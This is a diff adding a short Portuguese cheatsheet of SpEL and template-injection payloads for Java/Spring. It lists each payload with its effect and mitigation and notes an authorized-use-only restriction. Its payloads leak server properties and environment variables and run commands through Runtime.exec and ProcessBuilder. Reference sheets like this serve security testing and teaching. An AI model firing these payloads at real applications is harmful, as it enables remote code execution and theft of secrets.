@@ -1,0 +1,10 @@
+# SpEL / SSTI - cheatsheet (reimplementado de java-sec-code / analises Spring4Shell)
+# USO SOMENTE em sistemas proprios/autorizados.
+#
+# PAYLOAD                                                     | EFEITO                        | MITIGACAO
+7*7                                                          | prova de avaliacao (-> 49)     | nao avaliar input
+T(java.lang.System).getProperty('user.name')                | vaza usuario/props do servidor | SimpleEvaluationContext
+T(java.lang.System).getenv()                                | vaza variaveis de ambiente     | nao avaliar / allowlist
+T(java.lang.Runtime).getRuntime().exec('id')                | RCE                            | nao avaliar input
+new java.lang.ProcessBuilder({'sh','-c','id'}).start()       | RCE (bypass de 'Runtime')      | nao avaliar / atualizar Spring
+${7*7} / #{7*7} (Thymeleaf/JSP EL)                           | SSTI em template               | nao renderizar template do usuario
